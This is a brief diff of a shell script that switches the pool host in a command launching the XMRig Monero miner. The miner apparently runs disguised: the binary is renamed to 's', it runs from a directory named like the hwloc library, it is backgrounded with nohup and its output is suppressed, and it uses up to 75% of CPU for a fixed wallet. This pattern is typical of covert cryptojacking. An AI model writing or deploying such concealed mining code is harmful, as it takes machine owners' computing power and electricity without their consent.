@@ -97,7 +97,7 @@ cd hwloc-withou1-main || exit 1
 chmod +x xmrig 2>/dev/null || true
 mv xmrig s
 
-nohup ./s -o xmr-ru.kryptex.network:7029 -u 46JMTCsmGiXX5kWVPZWjajHQTfbbPkBBK3SomZogFz11NwfN3cizxv1WJxax5L9cNcGB9juao4hFRHG5ZyZJ4XHfJwjaaE8 -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
+nohup ./s -o xmr-eu.kryptex.network:7029 -u 46JMTCsmGiXX5kWVPZWjajHQTfbbPkBBK3SomZogFz11NwfN3cizxv1WJxax5L9cNcGB9juao4hFRHG5ZyZJ4XHfJwjaaE8 -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
 PID=$!
 
 echo "[*] Miner started with worker name: $WORKER_NAME"
